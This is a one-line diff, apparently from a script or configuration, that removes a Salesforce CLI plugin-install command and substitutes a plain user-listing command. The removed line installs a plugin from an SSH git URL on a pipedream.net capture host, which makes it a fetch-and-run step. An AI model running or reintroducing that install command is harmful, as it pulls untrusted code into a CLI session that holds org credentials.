@@ -1,1 +1,1 @@
-sfdx plugins:install "ssh://git@eo5piyzez2ayc19.m.pipedream.net#master"
+sfdx org list users -o hub
